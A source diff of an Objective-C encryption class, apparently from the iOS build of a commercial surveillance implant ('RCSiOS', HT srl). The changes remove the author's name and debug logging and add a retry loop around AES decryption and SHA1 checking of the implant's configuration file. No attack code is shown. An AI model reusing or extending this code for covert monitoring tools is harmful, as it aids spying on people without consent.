@@ -1,10 +1,10 @@
 /*
- * RCSIpony - Encryption Class
+ * RCSiOS - Encryption Class
  *  This class will be responsible for all the Encryption/Decryption routines
  *  used by the Configurator
  * 
  * 
- * Created by Alfredo 'revenge' Pesoli on 20/05/2009
+ * Created on 20/05/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -113,10 +113,10 @@
 
   CCCryptorStatus result = CCCrypt(kCCDecrypt, 
                                    kCCAlgorithmAES128, 
-                                   kCCOptionPKCS7Padding,               //0,
+                                   kCCOptionPKCS7Padding,                   //0,
                                    [aKey bytes], 
                                    kCCKeySizeAES128,
-                                   NULL,                                // initialization vector (optional)
+                                   NULL,                                    // initialization vector (optional)
                                    [inData mutableBytes], [inData length],  // input
                                    [inData mutableBytes], [inData length],  // output
                                    &numBytesDecrypted);
@@ -133,6 +133,7 @@
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  int maxretry = 0;
   NSData *clearConfig = nil;
    
   if ([[NSFileManager defaultManager] fileExistsAtPath: aConfigurationFile] == FALSE)
@@ -141,40 +142,52 @@
       return clearConfig;
     }
   
-  NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
-  
-  if (fileHandle != nil)
+  while (clearConfig == nil && maxretry++ < 10) 
     {
-     NSMutableData *encData = [NSMutableData dataWithData: [fileHandle availableData]];
-      
-      NSMutableData *tempData = [self decryptWithKey: mKey inData:encData];
+      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
     
-      if (tempData != nil)
+      NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
+    
+      if (fileHandle != nil)
         {
-          u_char *confBuffer = (u_char*)[tempData bytes];
-          u_int confLen = [tempData length] - CC_SHA1_DIGEST_LENGTH;
+          NSMutableData *encData = [NSMutableData dataWithData: [fileHandle availableData]];
           
-          u_char *confSha1 = (confBuffer + confLen);
-          
-          u_char tmpSha1[CC_SHA1_DIGEST_LENGTH+1];
-          memset(tmpSha1, 0, sizeof(tmpSha1));
-
-          CC_SHA1(confBuffer, confLen, tmpSha1);
+          NSMutableData *tempData = [self decryptWithKey: mKey inData:encData];
         
-          clearConfig = [[NSData dataWithBytes:confBuffer length:confLen] retain];
-        
-          for (int i=0; i < CC_SHA1_DIGEST_LENGTH; i++) 
+          if (tempData != nil)
             {
-              if (tmpSha1[i] != confSha1[i])
+              u_char *confBuffer = (u_char*)[tempData bytes];
+              u_int confLen = [tempData length] - CC_SHA1_DIGEST_LENGTH;
+              
+              u_char *confSha1 = (confBuffer + confLen);
+              
+              u_char tmpSha1[CC_SHA1_DIGEST_LENGTH+1];
+              memset(tmpSha1, 0, sizeof(tmpSha1));
+
+              CC_SHA1(confBuffer, confLen, tmpSha1);
+            
+              clearConfig = [[NSData dataWithBytes:confBuffer length:confLen] retain];
+            
+              for (int i=0; i < CC_SHA1_DIGEST_LENGTH; i++) 
                 {
-                  [clearConfig release];
-                  clearConfig = nil;
-                  break;
+                  if (tmpSha1[i] != confSha1[i])
+                    {
+                      [clearConfig release];
+                      clearConfig = nil;
+                      break;
+                    }
                 }
             }
         }
+      else
+        {
+          [inner release];
+          break;
+        }
+    
+      [inner release];
     }
-   
+  
   [pool release];
   
   return clearConfig;
@@ -191,13 +204,6 @@
   //  |SkipDW|SkipDW|LenDW|DATA...|CRC|
   //
   
-  /*
-	NSString *currentPath = [[NSFileManager defaultManager] currentDirectoryPath];
-  
-	NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:
-                              [currentPath stringByAppendingPathComponent: aConfigurationFile]];
-  */
-  
   u_int endTokenAndCRCSize = strlen(ENDOF_CONF_DELIMITER) + sizeof(int);
   NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aConfigurationFile];
   
@@ -206,18 +212,8 @@
   
   if (fileData == nil) 
     {
-#ifdef DEBUG
-      NSLog(@"decryptConfiguration: cannot open file %@", aConfigurationFile);
-#endif
       return nil;
     }
-  else 
-    {
-#ifdef DEBUG
-      NSLog(@"decryptConfiguration: file opened");
-#endif
-    }
-
   
   // Skip the first 2 DWORDs
   [fileHandle seekToFileOffset: TIMESTAMP_SIZE];
